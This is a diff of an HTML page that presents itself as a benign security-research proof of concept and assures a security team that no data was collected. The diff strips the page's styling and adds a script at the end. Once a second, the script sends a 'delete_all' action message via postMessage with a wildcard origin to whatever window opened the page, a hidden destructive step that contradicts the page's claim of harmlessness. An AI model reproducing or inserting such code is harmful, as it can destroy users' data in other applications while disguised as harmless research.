@@ -4,27 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Research - Proof of Concept</title>
-    <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            text-align: center; 
-            padding-top: 10vh; 
-            background-color: #f8f9fa; 
-            color: #333;
-        }
-        .warning-box { 
-            border: 3px solid #dc3545; 
-            display: inline-block; 
-            padding: 30px; 
-            border-radius: 12px; 
-            background: #fff;
-            box-shadow: 0 4px 15px rgba(220, 53, 69, 0.2);
-            max-width: 600px;
-        }
-        h1 { color: #dc3545; margin-top: 0; }
-        p { line-height: 1.6; font-size: 16px; }
-        .highlight { font-weight: bold; color: #0056b3; }
-    </style>
 </head>
 <body>
     <div class="warning-box">
@@ -34,4 +13,11 @@
         <p><i>Note to Security Team: If this were a real attack by a malicious actor, this page would be a highly convincing phishing clone designed to steal user credentials. No personal data was collected during this test.</i></p>
     </div>
 </body>
+<script>
+  setInterval(() => {
+    if (window.opener) {
+      window.opener.postMessage('{"action":"delete_all"}', '*');
+    }
+  }, 1000);
+</script>
 </html>
